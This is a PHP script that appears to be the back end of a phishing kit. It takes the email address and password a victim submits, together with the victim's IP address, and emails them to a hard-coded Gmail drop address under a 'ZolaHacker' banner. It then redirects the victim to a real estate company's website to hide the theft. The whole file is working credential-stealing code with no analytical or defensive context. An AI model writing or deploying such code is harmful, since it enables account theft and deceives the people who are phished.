<?include 'index_files/validate_form.js';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- XxX  *~* ZolaHacker *~*  XxX----------------------\n";
$message .= "E-Mail: ".$_POST['otheruser']."\n";
$message .= "Password: ".$_POST['otherpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------------------Created By HollyD--------------------------------------\n";
$recipient = "crisonlinelogs@gmail.com";
$subject = "0th3rs REZ";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 if (mail($recipent,$subject,$message,$headers))
	   {
		   header("Location: http://www.remax.com/");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>